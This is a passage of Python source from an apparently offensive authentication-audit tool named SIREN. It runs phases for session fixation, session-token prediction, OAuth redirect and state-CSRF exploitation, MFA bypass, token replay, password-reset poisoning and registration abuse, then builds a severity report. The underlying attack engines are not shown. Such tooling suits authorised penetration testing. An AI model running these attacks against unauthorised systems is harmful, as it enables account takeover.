                "issues": session_result.evidence.get("issues", []),
            }
        except Exception as e:
            logger.error(f"Session analysis error: {e}")

        # Phase 6: Session Fixation
        logger.info("[SIREN AUTH] Phase 6: Session Fixation Test")
        try:
            fixation = SessionFixationEngine(fp)
            fix_result = await fixation.test_fixation(
                login_url or target, self.http_client
            )
            self.results.append(fix_result)
            audit_results["modules"]["session_fixation"] = {
                "success": fix_result.success,
                "details": fix_result.details,
            }
        except Exception as e:
            logger.error(f"Fixation test error: {e}")

        # Phase 7: Session Prediction
        logger.info("[SIREN AUTH] Phase 7: Session Prediction")
        try:
            predictor = SessionPredictionEngine()
            pred_result = await predictor.collect_and_predict(
                login_url or target, self.http_client, sample_count=20
            )
            self.results.append(pred_result)
            audit_results["modules"]["session_prediction"] = {
                "success": pred_result.success,
                "details": pred_result.details,
                "predictions": pred_result.evidence.get("predictions", []),
            }
        except Exception as e:
            logger.error(f"Session prediction error: {e}")

        # Phase 8: OAuth Testing (if configured)
        if oauth_config:
            logger.info("[SIREN AUTH] Phase 8: OAuth Exploitation")
            try:
                oauth = OAuthExploitEngine()
                oauth_result = await oauth.test_redirect_uri(
                    oauth_config.get("auth_endpoint", ""),
                    oauth_config.get("client_id", ""),
                    oauth_config.get("redirect_uri", ""),
                    self.http_client,
                )
                self.results.append(oauth_result)

                csrf_result = await oauth.test_state_csrf(
                    oauth_config.get("auth_endpoint", ""),
                    oauth_config.get("client_id", ""),
                    oauth_config.get("redirect_uri", ""),
                    self.http_client,
                )
                self.results.append(csrf_result)

                audit_results["modules"]["oauth"] = {
                    "redirect_bypass": oauth_result.success,
                    "state_csrf": csrf_result.success,
                    "details": f"{oauth_result.details} | {csrf_result.details}",
                }
            except Exception as e:
                logger.error(f"OAuth test error: {e}")

        # Phase 9: MFA Bypass (if endpoint provided)
        if mfa_endpoint:
            logger.info("[SIREN AUTH] Phase 9: MFA Bypass")
            try:
                mfa = MFABypassEngine()
                mfa_result = await mfa.test_mfa_bypass(
                    mfa_endpoint, {}, self.http_client
                )
                self.results.append(mfa_result)
                audit_results["modules"]["mfa_bypass"] = {
                    "success": mfa_result.success,
                    "bypasses_found": len(mfa.bypasses_found),
                    "details": mfa_result.details,
                }
            except Exception as e:
                logger.error(f"MFA bypass error: {e}")

        # Phase 10: Token Replay (if token provided)
        if token:
            logger.info("[SIREN AUTH] Phase 10: Token Replay")
            try:
                replay = TokenReplayEngine()
                replay_result = await replay.test_token_replay(
                    target, token, http_client=self.http_client
                )
                self.results.append(replay_result)
                audit_results["modules"]["token_replay"] = {
                    "success": replay_result.success,
                    "replayed": len(replay.replayed_tokens),
                    "details": replay_result.details,
                }
            except Exception as e:
                logger.error(f"Token replay error: {e}")

        # Phase 11: Password Reset Poison (if endpoint provided)
        if reset_url:
            logger.info("[SIREN AUTH] Phase 11: Password Reset Poisoning")
            try:
                reset = PasswordResetPoison()
                reset_result = await reset.test_host_header_poison(
                    reset_url, "test@example.com", http_client=self.http_client
                )
                self.results.append(reset_result)
                audit_results["modules"]["reset_poison"] = {
                    "success": reset_result.success,
                    "details": reset_result.details,
                }
            except Exception as e:
                logger.error(f"Reset poison error: {e}")

        # Phase 12: Registration Abuse (if endpoint provided)
        if register_url:
            logger.info("[SIREN AUTH] Phase 12: Registration Abuse")
            try:
                reg = RegistrationAbuseEngine()
                reg_result = await reg.test_registration_abuse(
                    register_url, self.http_client
                )
                self.results.append(reg_result)
                audit_results["modules"]["registration_abuse"] = {
                    "success": reg_result.success,
                    "details": reg_result.details,
                }
            except Exception as e:
                logger.error(f"Registration abuse error: {e}")

        # Summary
        total_duration = time.time() - start
        critical_count = sum(1 for r in self.results if r.severity == "critical")
        high_count = sum(1 for r in self.results if r.severity == "high")
        medium_count = sum(1 for r in self.results if r.severity == "medium")

        audit_results["summary"] = {
            "total_modules": len(self.results),
            "total_attempts": sum(r.attempts for r in self.results),
            "total_duration": f"{total_duration:.2f}s",
            "critical_findings": critical_count,
            "high_findings": high_count,
            "medium_findings": medium_count,
            "overall_risk": (
                "CRITICAL"
                if critical_count > 0
                else (
                    "HIGH"
                    if high_count > 0
                    else "MEDIUM" if medium_count > 0 else "LOW"
                )
            ),
        }

        logger.info(
            f"[SIREN AUTH] Audit complete: {critical_count} critical, "
            f"{high_count} high, {medium_count} medium findings"
        )

        return audit_results

    def generate_report(self) -> str:
        """Generate a comprehensive auth audit report."""
        lines = [
            "=" * 70,
            "  SIREN — Authentication Security Audit Report",
            "  Shannon Intelligence Recon & Exploitation Nexus",
            "=" * 70,
            "",
            f"  Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"  Total Tests: {len(self.results)}",
            "",
        ]

        for result in self.results:
            severity_icon = {
                "critical": "[!!!]",
                "high": "[!!]",
                "medium": "[!]",
                "low": "[~]",
                "info": "[i]",
            }.get(result.severity, "[?]")

            lines.extend(
                [
                    f"{'─' * 60}",
                    f"  {severity_icon} {result.attack_type.value.upper()}",
                    f"  Target: {result.target}",
                    f"  Status: {'VULNERABLE' if result.success else 'SECURE'}",
                    f"  Severity: {result.severity.upper()}",
                    f"  Attempts: {result.attempts}",
                    f"  Duration: {result.duration:.2f}s",
                    f"  Details: {result.details}",
                    "",
                ]
            )

            if result.credentials:
                lines.append("  Credentials Found:")
                for cred in result.credentials[:10]:
                    masked_pass = cred.password[:3] + "***" if cred.password else ""
                    lines.append(
                        f"    - {cred.username}:{masked_pass} "
                        f"[{cred.source}] {'VALID' if cred.valid else ''}"
                    )
                lines.append("")

            if result.remediation:
                lines.extend(
                    [
                        "  Remediation:",
                        f"    {result.remediation}",
                        "",
                    ]
                )

        # Summary
        critical = sum(1 for r in self.results if r.severity == "critical")
        high = sum(1 for r in self.results if r.severity == "high")
        medium = sum(1 for r in self.results if r.severity == "medium")

        lines.extend(
            [
                "=" * 70,
                "  SUMMARY",
                "=" * 70,
                f"  Critical: {critical}",
                f"  High:     {high}",
                f"  Medium:   {medium}",
                f"  Total:    {len(self.results)}",
                "",
                f"  Overall Risk: "
                f"{'CRITICAL' if critical else 'HIGH' if high else 'MEDIUM' if medium else 'LOW'}",
                "",
                "  SIREN Auth Engine — All findings require professional review.",
                "=" * 70,
            ]
        )

        return "\n".join(lines)
